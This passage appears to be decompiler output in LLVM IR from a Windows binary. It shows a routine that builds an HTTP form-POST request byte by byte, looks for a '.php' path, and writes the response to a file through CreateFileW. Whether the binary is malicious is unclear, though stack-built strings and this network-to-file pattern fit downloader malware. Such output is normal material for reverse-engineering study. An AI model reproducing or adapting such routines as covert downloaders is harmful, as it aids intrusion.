  %615 = icmp eq i1 %613, %614, !insn.addr !6493
  store i32 %609, i32* %esp.10.reg2mem, !insn.addr !6493
  store i32 %609, i32* %esp.11.reg2mem, !insn.addr !6493
  br i1 %615, label %dec_label_pc_1000ad10, label %dec_label_pc_1000ad44, !insn.addr !6493

dec_label_pc_1000ad44:                            ; preds = %dec_label_pc_1000ad10, %dec_label_pc_1000acdc
  %esp.11.reload = load i32, i32* %esp.11.reg2mem
  %616 = load i32, i32* %421, align 4, !insn.addr !6494
  %617 = add i32 %esp.11.reload, -4, !insn.addr !6494
  %618 = inttoptr i32 %617 to i32*, !insn.addr !6494
  store i32 %616, i32* %618, align 4, !insn.addr !6494
  %619 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !6495
  %620 = add i32 %esp.11.reload, -8, !insn.addr !6496
  %621 = inttoptr i32 %620 to i32*, !insn.addr !6496
  store i32 %510, i32* %621, align 4, !insn.addr !6496
  %622 = call i32 @closesocket(i32 ptrtoint (i32* @1 to i32)), !insn.addr !6497
  br label %dec_label_pc_1000b09b, !insn.addr !6498

dec_label_pc_1000ad5c:                            ; preds = %dec_label_pc_1000aaf1
  store i32 0, i32* %425, align 4, !insn.addr !6499
  %623 = add i32 %esp.9.reload, -2420, !insn.addr !6500
  store i32 %623, i32* %473, align 4, !insn.addr !6501
  %624 = icmp eq i32 %623, 0, !insn.addr !6502
  br i1 %624, label %dec_label_pc_1000b09b, label %dec_label_pc_1000ad73, !insn.addr !6503

dec_label_pc_1000ad73:                            ; preds = %dec_label_pc_1000ad5c
  %625 = add i32 %esp.9.reload, -2460, !insn.addr !6504
  %626 = inttoptr i32 %625 to i32*, !insn.addr !6504
  store i32 1, i32* %626, align 4, !insn.addr !6504
  %627 = add i32 %esp.9.reload, -2464, !insn.addr !6505
  %628 = inttoptr i32 %627 to i32*, !insn.addr !6505
  store i32 0, i32* %628, align 4, !insn.addr !6505
  %629 = add i32 %esp.9.reload, -2468, !insn.addr !6506
  %630 = inttoptr i32 %629 to i32*, !insn.addr !6506
  store i32 3, i32* %630, align 4, !insn.addr !6506
  %631 = add i32 %esp.9.reload, -2472, !insn.addr !6507
  %632 = inttoptr i32 %631 to i32*, !insn.addr !6507
  store i32 0, i32* %632, align 4, !insn.addr !6507
  %633 = add i32 %esp.9.reload, -2476, !insn.addr !6508
  %634 = inttoptr i32 %633 to i32*, !insn.addr !6508
  store i32 0, i32* %634, align 4, !insn.addr !6508
  %635 = add i32 %esp.9.reload, -2480, !insn.addr !6509
  %636 = inttoptr i32 %635 to i32*, !insn.addr !6509
  store i32 80, i32* %636, align 4, !insn.addr !6509
  %637 = load i32, i32* %421, align 4, !insn.addr !6510
  %638 = add i32 %esp.9.reload, -2484, !insn.addr !6510
  %639 = inttoptr i32 %638 to i32*, !insn.addr !6510
  store i32 %637, i32* %639, align 4, !insn.addr !6510
  %640 = load i32, i32* @global_var_10040984, align 4, !insn.addr !6511
  %641 = add i32 %esp.9.reload, -2488, !insn.addr !6511
  %642 = inttoptr i32 %641 to i32*, !insn.addr !6511
  store i32 %640, i32* %642, align 4, !insn.addr !6511
  %643 = add i32 %esp.9.reload, -2416, !insn.addr !6512
  %644 = inttoptr i32 %643 to i32*, !insn.addr !6512
  store i32 %623, i32* %644, align 4, !insn.addr !6512
  %645 = load i128, i128* @global_var_10039c20, align 4, !insn.addr !6513
  %646 = call i128 @__asm_movaps(i128 %645), !insn.addr !6513
  %647 = add i32 %esp.9.reload, -336, !insn.addr !6514
  %648 = inttoptr i32 %647 to i128*, !insn.addr !6514
  %649 = load i128, i128* %648, align 4, !insn.addr !6514
  call void @__asm_movups(i128 %649, i128 %646), !insn.addr !6514
  %650 = add i32 %esp.9.reload, -2492, !insn.addr !6515
  %651 = inttoptr i32 %650 to i32*, !insn.addr !6515
  store i32 100, i32* %651, align 4, !insn.addr !6515
  %652 = load i128, i128* @global_var_100399f0, align 4, !insn.addr !6516
  %653 = call i128 @__asm_movaps(i128 %652), !insn.addr !6516
  %654 = add i32 %esp.9.reload, -320, !insn.addr !6517
  %655 = inttoptr i32 %654 to i128*, !insn.addr !6517
  %656 = load i128, i128* %655, align 4, !insn.addr !6517
  call void @__asm_movups(i128 %656, i128 %653), !insn.addr !6517
  %657 = call i128 @__asm_movaps(i128 521286166512744085559482823493185382), !insn.addr !6518
  %658 = add i32 %esp.9.reload, -304, !insn.addr !6519
  %659 = inttoptr i32 %658 to i128*, !insn.addr !6519
  %660 = load i128, i128* %659, align 4, !insn.addr !6519
  call void @__asm_movups(i128 %660, i128 %657), !insn.addr !6519
  %661 = call i32 @_malloc(), !insn.addr !6520
  %662 = add i32 %esp.9.reload, -2392, !insn.addr !6521
  %663 = inttoptr i32 %662 to i32*, !insn.addr !6521
  store i32 %661, i32* %663, align 4, !insn.addr !6521
  %664 = add i32 %esp.9.reload, -2388, !insn.addr !6522
  %665 = inttoptr i32 %664 to i32*, !insn.addr !6522
  store i32 0, i32* %665, align 4, !insn.addr !6522
  store i32 0, i32* %421, align 4, !insn.addr !6523
  %666 = inttoptr i32 %661 to i8*, !insn.addr !6524
  store i8 97, i8* %666, align 1, !insn.addr !6524
  %667 = load i32, i32* %663, align 4, !insn.addr !6525
  %668 = add i32 %667, 1, !insn.addr !6526
  %669 = inttoptr i32 %668 to i8*, !insn.addr !6526
  store i8 112, i8* %669, align 1, !insn.addr !6526
  %670 = load i32, i32* %663, align 4, !insn.addr !6527
  %671 = add i32 %670, 2, !insn.addr !6528
  %672 = inttoptr i32 %671 to i8*, !insn.addr !6528
  store i8 112, i8* %672, align 1, !insn.addr !6528
  %673 = load i32, i32* %663, align 4, !insn.addr !6529
  %674 = add i32 %673, 3, !insn.addr !6530
  %675 = inttoptr i32 %674 to i8*, !insn.addr !6530
  store i8 108, i8* %675, align 1, !insn.addr !6530
  %676 = load i32, i32* %663, align 4, !insn.addr !6531
  %677 = add i32 %676, 4, !insn.addr !6532
  %678 = inttoptr i32 %677 to i8*, !insn.addr !6532
  store i8 105, i8* %678, align 1, !insn.addr !6532
  %679 = load i32, i32* %663, align 4, !insn.addr !6533
  %680 = add i32 %679, 5, !insn.addr !6534
  %681 = inttoptr i32 %680 to i8*, !insn.addr !6534
  store i8 99, i8* %681, align 1, !insn.addr !6534
  %682 = load i32, i32* %663, align 4, !insn.addr !6535
  %683 = add i32 %682, 6, !insn.addr !6536
  %684 = inttoptr i32 %683 to i8*, !insn.addr !6536
  store i8 97, i8* %684, align 1, !insn.addr !6536
  %685 = load i32, i32* %663, align 4, !insn.addr !6537
  %686 = add i32 %685, 7, !insn.addr !6538
  %687 = inttoptr i32 %686 to i8*, !insn.addr !6538
  store i8 116, i8* %687, align 1, !insn.addr !6538
  %688 = load i32, i32* %663, align 4, !insn.addr !6539
  %689 = add i32 %688, 8, !insn.addr !6540
  %690 = inttoptr i32 %689 to i8*, !insn.addr !6540
  store i8 105, i8* %690, align 1, !insn.addr !6540
  %691 = load i32, i32* %663, align 4, !insn.addr !6541
  %692 = add i32 %691, 9, !insn.addr !6542
  %693 = inttoptr i32 %692 to i8*, !insn.addr !6542
  store i8 111, i8* %693, align 1, !insn.addr !6542
  %694 = load i32, i32* %663, align 4, !insn.addr !6543
  %695 = add i32 %694, 10, !insn.addr !6544
  %696 = inttoptr i32 %695 to i8*, !insn.addr !6544
  store i8 110, i8* %696, align 1, !insn.addr !6544
  %697 = load i32, i32* %663, align 4, !insn.addr !6545
  %698 = add i32 %697, 11, !insn.addr !6546
  %699 = inttoptr i32 %698 to i8*, !insn.addr !6546
  store i8 47, i8* %699, align 1, !insn.addr !6546
  %700 = load i32, i32* %663, align 4, !insn.addr !6547
  %701 = add i32 %700, 12, !insn.addr !6548
  %702 = inttoptr i32 %701 to i8*, !insn.addr !6548
  store i8 120, i8* %702, align 1, !insn.addr !6548
  %703 = load i32, i32* %663, align 4, !insn.addr !6549
  %704 = add i32 %703, 13, !insn.addr !6550
  %705 = inttoptr i32 %704 to i8*, !insn.addr !6550
  store i8 45, i8* %705, align 1, !insn.addr !6550
  %706 = load i32, i32* %663, align 4, !insn.addr !6551
  %707 = add i32 %706, 14, !insn.addr !6552
  %708 = inttoptr i32 %707 to i8*, !insn.addr !6552
  store i8 119, i8* %708, align 1, !insn.addr !6552
  %709 = load i32, i32* %663, align 4, !insn.addr !6553
  %710 = add i32 %709, 15, !insn.addr !6554
  %711 = inttoptr i32 %710 to i8*, !insn.addr !6554
  store i8 119, i8* %711, align 1, !insn.addr !6554
  %712 = load i32, i32* %663, align 4, !insn.addr !6555
  %713 = add i32 %712, 16, !insn.addr !6556
  %714 = inttoptr i32 %713 to i8*, !insn.addr !6556
  store i8 119, i8* %714, align 1, !insn.addr !6556
  %715 = load i32, i32* %663, align 4, !insn.addr !6557
  %716 = add i32 %715, 17, !insn.addr !6558
  %717 = inttoptr i32 %716 to i8*, !insn.addr !6558
  store i8 45, i8* %717, align 1, !insn.addr !6558
  %718 = load i32, i32* %663, align 4, !insn.addr !6559
  %719 = add i32 %718, 18, !insn.addr !6560
  %720 = inttoptr i32 %719 to i8*, !insn.addr !6560
  store i8 102, i8* %720, align 1, !insn.addr !6560
  %721 = load i32, i32* %663, align 4, !insn.addr !6561
  %722 = add i32 %721, 19, !insn.addr !6562
  %723 = inttoptr i32 %722 to i8*, !insn.addr !6562
  store i8 111, i8* %723, align 1, !insn.addr !6562
  %724 = load i32, i32* %663, align 4, !insn.addr !6563
  %725 = add i32 %724, 20, !insn.addr !6564
  %726 = inttoptr i32 %725 to i8*, !insn.addr !6564
  store i8 114, i8* %726, align 1, !insn.addr !6564
  %727 = load i32, i32* %663, align 4, !insn.addr !6565
  %728 = add i32 %727, 21, !insn.addr !6566
  %729 = inttoptr i32 %728 to i8*, !insn.addr !6566
  store i8 109, i8* %729, align 1, !insn.addr !6566
  %730 = load i32, i32* %663, align 4, !insn.addr !6567
  %731 = add i32 %730, 22, !insn.addr !6568
  %732 = inttoptr i32 %731 to i8*, !insn.addr !6568
  store i8 45, i8* %732, align 1, !insn.addr !6568
  %733 = load i32, i32* %663, align 4, !insn.addr !6569
  %734 = add i32 %733, 23, !insn.addr !6570
  %735 = inttoptr i32 %734 to i8*, !insn.addr !6570
  store i8 117, i8* %735, align 1, !insn.addr !6570
  %736 = load i32, i32* %663, align 4, !insn.addr !6571
  %737 = add i32 %736, 24, !insn.addr !6572
  %738 = inttoptr i32 %737 to i8*, !insn.addr !6572
  store i8 114, i8* %738, align 1, !insn.addr !6572
  %739 = load i32, i32* %663, align 4, !insn.addr !6573
  %740 = add i32 %739, 25, !insn.addr !6574
  %741 = inttoptr i32 %740 to i8*, !insn.addr !6574
  store i8 108, i8* %741, align 1, !insn.addr !6574
  %742 = load i32, i32* %663, align 4, !insn.addr !6575
  %743 = add i32 %742, 26, !insn.addr !6576
  %744 = inttoptr i32 %743 to i8*, !insn.addr !6576
  store i8 101, i8* %744, align 1, !insn.addr !6576
  %745 = load i32, i32* %663, align 4, !insn.addr !6577
  %746 = add i32 %745, 27, !insn.addr !6578
  %747 = inttoptr i32 %746 to i8*, !insn.addr !6578
  store i8 110, i8* %747, align 1, !insn.addr !6578
  %748 = load i32, i32* %663, align 4, !insn.addr !6579
  %749 = add i32 %748, 28, !insn.addr !6580
  %750 = inttoptr i32 %749 to i8*, !insn.addr !6580
  store i8 99, i8* %750, align 1, !insn.addr !6580
  %751 = load i32, i32* %663, align 4, !insn.addr !6581
  %752 = add i32 %751, 29, !insn.addr !6582
  %753 = inttoptr i32 %752 to i8*, !insn.addr !6582
  store i8 111, i8* %753, align 1, !insn.addr !6582
  %754 = load i32, i32* %663, align 4, !insn.addr !6583
  %755 = add i32 %754, 30, !insn.addr !6584
  %756 = inttoptr i32 %755 to i8*, !insn.addr !6584
  store i8 100, i8* %756, align 1, !insn.addr !6584
  %757 = load i32, i32* %663, align 4, !insn.addr !6585
  %758 = add i32 %757, 31, !insn.addr !6586
  %759 = inttoptr i32 %758 to i8*, !insn.addr !6586
  store i8 101, i8* %759, align 1, !insn.addr !6586
  %760 = load i32, i32* %663, align 4, !insn.addr !6587
  %761 = add i32 %760, 32, !insn.addr !6588
  %762 = inttoptr i32 %761 to i8*, !insn.addr !6588
  store i8 100, i8* %762, align 1, !insn.addr !6588
  %763 = load i32, i32* %663, align 4, !insn.addr !6589
  %764 = add i32 %763, 33, !insn.addr !6590
  %765 = inttoptr i32 %764 to i8*, !insn.addr !6590
  store i8 0, i8* %765, align 1, !insn.addr !6590
  %766 = add i32 %esp.9.reload, -24, !insn.addr !6591
  %767 = inttoptr i32 %766 to i32*, !insn.addr !6591
  store i32 1414745936, i32* %767, align 4, !insn.addr !6591
  %768 = add i32 %esp.9.reload, -20, !insn.addr !6592
  %769 = inttoptr i32 %768 to i8*, !insn.addr !6592
  store i8 0, i8* %769, align 1, !insn.addr !6592
  store i32 %ecx.8.reload, i32* %ecx.9.reg2mem, !insn.addr !6593
  br label %dec_label_pc_1000af50, !insn.addr !6593

dec_label_pc_1000af50:                            ; preds = %dec_label_pc_1000af50, %dec_label_pc_1000ad73
  %ecx.9.reload = load i32, i32* %ecx.9.reg2mem
  %770 = inttoptr i32 %ecx.9.reload to i8*, !insn.addr !6594
  %771 = load i8, i8* %770, align 1, !insn.addr !6594
  %772 = add i32 %ecx.9.reload, 1, !insn.addr !6595
  %773 = icmp eq i8 %771, 0, !insn.addr !6596
  %774 = icmp eq i1 %773, false, !insn.addr !6597
  store i32 %772, i32* %ecx.9.reg2mem, !insn.addr !6597
  br i1 %774, label %dec_label_pc_1000af50, label %dec_label_pc_1000af57, !insn.addr !6597

dec_label_pc_1000af57:                            ; preds = %dec_label_pc_1000af50
  %775 = icmp eq i32 %ecx.9.reload, %ecx.8.reload, !insn.addr !6598
  store i32 0, i32* %edx.7.reg2mem, !insn.addr !6599
  br i1 %775, label %dec_label_pc_1000af9d, label %dec_label_pc_1000af60, !insn.addr !6599

dec_label_pc_1000af60:                            ; preds = %dec_label_pc_1000af57, %dec_label_pc_1000af97
  %edx.7.reload = load i32, i32* %edx.7.reg2mem
  %776 = add i32 %edx.7.reload, %ecx.8.reload
  %777 = inttoptr i32 %776 to i8*, !insn.addr !6600
  %778 = load i8, i8* %777, align 1, !insn.addr !6600
  %779 = icmp eq i8 %778, 46, !insn.addr !6600
  %780 = icmp eq i1 %779, false, !insn.addr !6601
  br i1 %780, label %dec_label_pc_1000af8a, label %dec_label_pc_1000af6b, !insn.addr !6601

dec_label_pc_1000af6b:                            ; preds = %dec_label_pc_1000af60
  %781 = add i32 %776, 1, !insn.addr !6602
  %782 = inttoptr i32 %781 to i8*, !insn.addr !6602
  %783 = load i8, i8* %782, align 1, !insn.addr !6602
  %784 = icmp eq i8 %783, 112, !insn.addr !6602
  %785 = icmp eq i1 %784, false, !insn.addr !6603
  br i1 %785, label %dec_label_pc_1000af8a, label %dec_label_pc_1000af72, !insn.addr !6603

dec_label_pc_1000af72:                            ; preds = %dec_label_pc_1000af6b
  %786 = add i32 %776, 2, !insn.addr !6604
  %787 = inttoptr i32 %786 to i8*, !insn.addr !6604
  %788 = load i8, i8* %787, align 1, !insn.addr !6604
  %789 = icmp eq i8 %788, 104, !insn.addr !6604
  %790 = icmp eq i1 %789, false, !insn.addr !6605
  br i1 %790, label %dec_label_pc_1000af8a, label %dec_label_pc_1000af79, !insn.addr !6605

dec_label_pc_1000af79:                            ; preds = %dec_label_pc_1000af72
  %791 = add i32 %776, 3, !insn.addr !6606
  %792 = inttoptr i32 %791 to i8*, !insn.addr !6606
  %793 = load i8, i8* %792, align 1, !insn.addr !6606
  %794 = icmp eq i8 %793, 112, !insn.addr !6606
  %795 = icmp eq i1 %794, false, !insn.addr !6607
  br i1 %795, label %dec_label_pc_1000af8a, label %dec_label_pc_1000af80, !insn.addr !6607

dec_label_pc_1000af80:                            ; preds = %dec_label_pc_1000af79
  %796 = add i32 %776, 5, !insn.addr !6608
  %797 = add i32 %776, 4, !insn.addr !6609
  %798 = inttoptr i32 %797 to i8*, !insn.addr !6609
  store i8 0, i8* %798, align 1, !insn.addr !6609
  store i32 %796, i32* %421, align 4, !insn.addr !6610
  br label %dec_label_pc_1000af8a, !insn.addr !6610

dec_label_pc_1000af8a:                            ; preds = %dec_label_pc_1000af80, %dec_label_pc_1000af79, %dec_label_pc_1000af72, %dec_label_pc_1000af6b, %dec_label_pc_1000af60
  store i32 %ecx.8.reload, i32* %eax.7.reg2mem, !insn.addr !6611
  br label %dec_label_pc_1000af90, !insn.addr !6611

dec_label_pc_1000af90:                            ; preds = %dec_label_pc_1000af90, %dec_label_pc_1000af8a
  %eax.7.reload = load i32, i32* %eax.7.reg2mem
  %799 = inttoptr i32 %eax.7.reload to i8*, !insn.addr !6612
  %800 = load i8, i8* %799, align 1, !insn.addr !6612
  %801 = add i32 %eax.7.reload, 1, !insn.addr !6613
  %802 = icmp eq i8 %800, 0, !insn.addr !6614
  %803 = icmp eq i1 %802, false, !insn.addr !6615
  store i32 %801, i32* %eax.7.reg2mem, !insn.addr !6615
  br i1 %803, label %dec_label_pc_1000af90, label %dec_label_pc_1000af97, !insn.addr !6615

dec_label_pc_1000af97:                            ; preds = %dec_label_pc_1000af90
  %804 = add nuw i32 %edx.7.reload, 1, !insn.addr !6616
  %805 = sub i32 %eax.7.reload, %ecx.8.reload, !insn.addr !6617
  %806 = icmp ult i32 %804, %805, !insn.addr !6618
  store i32 %804, i32* %edx.7.reg2mem, !insn.addr !6619
  br i1 %806, label %dec_label_pc_1000af60, label %dec_label_pc_1000af9d, !insn.addr !6619

dec_label_pc_1000af9d:                            ; preds = %dec_label_pc_1000af97, %dec_label_pc_1000af57
  store i32 0, i32* %651, align 4, !insn.addr !6620
  %807 = add i32 %esp.9.reload, -2496, !insn.addr !6621
  %808 = inttoptr i32 %807 to i32*, !insn.addr !6621
  store i32 -2080374784, i32* %808, align 4, !insn.addr !6621
  %809 = add i32 %esp.9.reload, -2500, !insn.addr !6622
  %810 = inttoptr i32 %809 to i32*, !insn.addr !6622
  store i32 %662, i32* %810, align 4, !insn.addr !6622
  %811 = add i32 %esp.9.reload, -2504, !insn.addr !6623
  %812 = inttoptr i32 %811 to i32*, !insn.addr !6623
  store i32 0, i32* %812, align 4, !insn.addr !6623
  %813 = add i32 %esp.9.reload, -2508, !insn.addr !6624
  %814 = inttoptr i32 %813 to i32*, !insn.addr !6624
  store i32 0, i32* %814, align 4, !insn.addr !6624
  %815 = add i32 %esp.9.reload, -2512, !insn.addr !6625
  %816 = inttoptr i32 %815 to i32*, !insn.addr !6625
  store i32 %ecx.8.reload, i32* %816, align 4, !insn.addr !6625
  %817 = add i32 %esp.9.reload, -2516, !insn.addr !6626
  %818 = inttoptr i32 %817 to i32*, !insn.addr !6626
  store i32 %766, i32* %818, align 4, !insn.addr !6626
  %819 = add i32 %esp.9.reload, -2520, !insn.addr !6627
  %820 = inttoptr i32 %819 to i32*, !insn.addr !6627
  store i32 %623, i32* %820, align 4, !insn.addr !6627
  %821 = icmp eq i32 %766, 0, !insn.addr !6628
  store i32 %647, i32* %esi.10.reg2mem, !insn.addr !6629
  br i1 %821, label %dec_label_pc_1000acc9, label %dec_label_pc_1000afd0, !insn.addr !6629

dec_label_pc_1000afd0:                            ; preds = %dec_label_pc_1000af9d, %dec_label_pc_1000afd0
  %esi.10.reload = load i32, i32* %esi.10.reg2mem
  %822 = inttoptr i32 %esi.10.reload to i8*, !insn.addr !6630
  %823 = load i8, i8* %822, align 1, !insn.addr !6630
  %824 = add i32 %esi.10.reload, 1, !insn.addr !6631
  %825 = icmp eq i8 %823, 0, !insn.addr !6632
  %826 = icmp eq i1 %825, false, !insn.addr !6633
  store i32 %824, i32* %esi.10.reg2mem, !insn.addr !6633
  br i1 %826, label %dec_label_pc_1000afd0, label %dec_label_pc_1000afd7, !insn.addr !6633

dec_label_pc_1000afd7:                            ; preds = %dec_label_pc_1000afd0
  %827 = load i32, i32* %421, align 4, !insn.addr !6634
  %.neg = sub i32 335, %esp.9.reload, !insn.addr !6635
  %828 = add i32 %.neg, %824, !insn.addr !6636
  %829 = add i32 %esp.9.reload, -2524, !insn.addr !6637
  %830 = inttoptr i32 %829 to i32*, !insn.addr !6637
  store i32 %827, i32* %830, align 4, !insn.addr !6637
  %831 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6638
  %832 = add i32 %esp.9.reload, -2528, !insn.addr !6639
  %833 = inttoptr i32 %832 to i32*, !insn.addr !6639
  store i32 %831, i32* %833, align 4, !insn.addr !6639
  %834 = add i32 %esp.9.reload, -2532, !insn.addr !6640
  %835 = inttoptr i32 %834 to i32*, !insn.addr !6640
  store i32 %827, i32* %835, align 4, !insn.addr !6640
  %836 = add i32 %esp.9.reload, -2536, !insn.addr !6641
  %837 = inttoptr i32 %836 to i32*, !insn.addr !6641
  store i32 %828, i32* %837, align 4, !insn.addr !6641
  %838 = add i32 %esp.9.reload, -2540, !insn.addr !6642
  %839 = inttoptr i32 %838 to i32*, !insn.addr !6642
  store i32 %647, i32* %839, align 4, !insn.addr !6642
  %840 = add i32 %esp.9.reload, -2544, !insn.addr !6643
  %841 = inttoptr i32 %840 to i32*, !insn.addr !6643
  store i32 %766, i32* %841, align 4, !insn.addr !6643
  %842 = add i32 %esp.9.reload, -2548, !insn.addr !6644
  %843 = inttoptr i32 %842 to i32*, !insn.addr !6644
  store i32 0, i32* %843, align 4, !insn.addr !6644
  %844 = add i32 %esp.9.reload, -2552, !insn.addr !6645
  %845 = inttoptr i32 %844 to i32*, !insn.addr !6645
  store i32 128, i32* %845, align 4, !insn.addr !6645
  %846 = add i32 %esp.9.reload, -2556, !insn.addr !6646
  %847 = inttoptr i32 %846 to i32*, !insn.addr !6646
  store i32 2, i32* %847, align 4, !insn.addr !6646
  %848 = add i32 %esp.9.reload, -2560, !insn.addr !6647
  %849 = inttoptr i32 %848 to i32*, !insn.addr !6647
  store i32 0, i32* %849, align 4, !insn.addr !6647
  %850 = add i32 %esp.9.reload, -2564, !insn.addr !6648
  %851 = inttoptr i32 %850 to i32*, !insn.addr !6648
  store i32 0, i32* %851, align 4, !insn.addr !6648
  %852 = add i32 %esp.9.reload, -2568, !insn.addr !6649
  %853 = inttoptr i32 %852 to i32*, !insn.addr !6649
  store i32 1073741824, i32* %853, align 4, !insn.addr !6649
  %854 = load i32, i32* %418, align 4, !insn.addr !6650
  %855 = add i32 %esp.9.reload, -2572, !insn.addr !6650
  %856 = inttoptr i32 %855 to i32*, !insn.addr !6650
  store i32 %854, i32* %856, align 4, !insn.addr !6650
  %857 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !6651
  %858 = ptrtoint i32* %857 to i32, !insn.addr !6651
  %859 = add i32 %esp.9.reload, -2576, !insn.addr !6652
  %860 = inttoptr i32 %859 to i32*, !insn.addr !6652
  store i32 %474, i32* %860, align 4, !insn.addr !6652
  %861 = add i32 %esp.9.reload, -2580, !insn.addr !6653
  %862 = inttoptr i32 %861 to i32*, !insn.addr !6653
  store i32 2048, i32* %862, align 4, !insn.addr !6653
  %863 = add i32 %esp.9.reload, -2384, !insn.addr !6654
  %864 = add i32 %esp.9.reload, -2584, !insn.addr !6655
  %865 = inttoptr i32 %864 to i32*, !insn.addr !6655
  store i32 %863, i32* %865, align 4, !insn.addr !6655
  %866 = add i32 %esp.9.reload, -2588, !insn.addr !6656
  %867 = inttoptr i32 %866 to i32*, !insn.addr !6656
  store i32 %766, i32* %867, align 4, !insn.addr !6656
  %868 = icmp eq i32 %863, 0, !insn.addr !6657
  store i32 -204, i32* %esp.13.reg2mem, !insn.addr !6658
  br i1 %868, label %dec_label_pc_1000b07c, label %dec_label_pc_1000b040.preheader, !insn.addr !6658

dec_label_pc_1000b040.preheader:                  ; preds = %dec_label_pc_1000afd7
  %869 = load i32, i32* %475, align 4, !insn.addr !6659
  %870 = icmp eq i32 %869, 0, !insn.addr !6660
  store i32 %866, i32* %esp.13.reg2mem, !insn.addr !6661
  br i1 %870, label %dec_label_pc_1000b07c, label %dec_label_pc_1000b04a.lr.ph, !insn.addr !6661

dec_label_pc_1000b04a.lr.ph:                      ; preds = %dec_label_pc_1000b040.preheader
  %871 = add i32 %esp.9.reload, -2412, !insn.addr !6662
  store i32 %869, i32* %.reg2mem
  store i32 %866, i32* %esp.1226.reg2mem
  br label %dec_label_pc_1000b04a

dec_label_pc_1000b04a:                            ; preds = %dec_label_pc_1000b04a.lr.ph, %dec_label_pc_1000b04a
  %esp.1226.reload = load i32, i32* %esp.1226.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %872 = add i32 %esp.1226.reload, -4, !insn.addr !6663
  %873 = inttoptr i32 %872 to i32*, !insn.addr !6663
  store i32 0, i32* %873, align 4, !insn.addr !6663
  %874 = add i32 %esp.1226.reload, -8, !insn.addr !6664
  %875 = inttoptr i32 %874 to i32*, !insn.addr !6664
  store i32 %871, i32* %875, align 4, !insn.addr !6664
  %876 = add i32 %esp.1226.reload, -12, !insn.addr !6665
  %877 = inttoptr i32 %876 to i32*, !insn.addr !6665
  store i32 %.reload, i32* %877, align 4, !insn.addr !6665
  %878 = add i32 %esp.1226.reload, -16, !insn.addr !6666
  %879 = inttoptr i32 %878 to i32*, !insn.addr !6666
  store i32 %863, i32* %879, align 4, !insn.addr !6666
  %880 = add i32 %esp.1226.reload, -20, !insn.addr !6667
  %881 = inttoptr i32 %880 to i32*, !insn.addr !6667
  store i32 %858, i32* %881, align 4, !insn.addr !6667
  %882 = add i32 %esp.1226.reload, -24, !insn.addr !6668
  %883 = inttoptr i32 %882 to i32*, !insn.addr !6668
  store i32 %474, i32* %883, align 4, !insn.addr !6668
  %884 = add i32 %esp.1226.reload, -28, !insn.addr !6669
  %885 = inttoptr i32 %884 to i32*, !insn.addr !6669
  store i32 2048, i32* %885, align 4, !insn.addr !6669
  %886 = add i32 %esp.1226.reload, -32, !insn.addr !6670
  %887 = inttoptr i32 %886 to i32*, !insn.addr !6670
  store i32 %863, i32* %887, align 4, !insn.addr !6670
  %888 = add i32 %esp.1226.reload, -36, !insn.addr !6671
  %889 = inttoptr i32 %888 to i32*, !insn.addr !6671
  store i32 %766, i32* %889, align 4, !insn.addr !6671
  %890 = load i32, i32* %475, align 4, !insn.addr !6659
  %891 = icmp eq i32 %890, 0, !insn.addr !6660
  store i32 %890, i32* %.reg2mem, !insn.addr !6661
  store i32 %888, i32* %esp.1226.reg2mem, !insn.addr !6661
  store i32 %888, i32* %esp.13.reg2mem, !insn.addr !6661
  br i1 %891, label %dec_label_pc_1000b07c, label %dec_label_pc_1000b04a, !insn.addr !6661

dec_label_pc_1000b07c:                            ; preds = %dec_label_pc_1000b04a, %dec_label_pc_1000b040.preheader, %dec_label_pc_1000afd7
  %esp.13.reload = load i32, i32* %esp.13.reg2mem
  %892 = add i32 %esp.13.reload, -4, !insn.addr !6672
  %893 = inttoptr i32 %892 to i32*, !insn.addr !6672
  store i32 %766, i32* %893, align 4, !insn.addr !6672
  %894 = load i32, i32* %644, align 4, !insn.addr !6673
  %895 = add i32 %esp.13.reload, -8, !insn.addr !6673
  %896 = inttoptr i32 %895 to i32*, !insn.addr !6673
  store i32 %894, i32* %896, align 4, !insn.addr !6673
  %897 = add i32 %esp.13.reload, -12, !insn.addr !6674
  %898 = inttoptr i32 %897 to i32*, !insn.addr !6674
  store i32 %858, i32* %898, align 4, !insn.addr !6674
  %899 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !6675
  br label %dec_label_pc_1000b09b, !insn.addr !6675

dec_label_pc_1000b09b:                            ; preds = %dec_label_pc_1000ad44, %dec_label_pc_1000ad5c, %dec_label_pc_1000b07c, %dec_label_pc_1000ac0f
  %900 = call i32 @"@__security_check_cookie@4"(), !insn.addr !6676
  ret i32 %900, !insn.addr !6677
}

define i32 @function_1000b0c0() local_unnamed_addr {
dec_label_pc_1000b0c0:
  %eax.1.reg2mem = alloca i32, !insn.addr !6678
  %esi.0.reg2mem = alloca i32, !insn.addr !6678
  %ecx.0.in.reg2mem = alloca i32, !insn.addr !6678
  %eax.0.reg2mem = alloca i32, !insn.addr !6678
  %edi.1.reg2mem = alloca i32, !insn.addr !6678
  %edi.0.reg2mem = alloca i32, !insn.addr !6678
  %edx.0.reg2mem = alloca i32, !insn.addr !6678
  %stack_var_-8.0.reg2mem = alloca i8, !insn.addr !6678
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp slt i32 %1, 1
  store i32 0, i32* %edi.1.reg2mem, !insn.addr !6679
  br i1 %2, label %dec_label_pc_1000b112, label %dec_label_pc_1000b0d6, !insn.addr !6679

dec_label_pc_1000b0d6:                            ; preds = %dec_label_pc_1000b0c0
  %3 = trunc i32 %1 to i8, !insn.addr !6680
  store i8 %3, i8* %stack_var_-8.0.reg2mem, !insn.addr !6681
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !6681
  br label %dec_label_pc_1000b0e0, !insn.addr !6681

dec_label_pc_1000b0e0:                            ; preds = %dec_label_pc_1000b0e0, %dec_label_pc_1000b0d6
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %stack_var_-8.0.reload = load i8, i8* %stack_var_-8.0.reg2mem
  %4 = sext i32 %edx.0.reload to i64, !insn.addr !6682
  %5 = mul nsw i64 %4, 1717986919, !insn.addr !6682
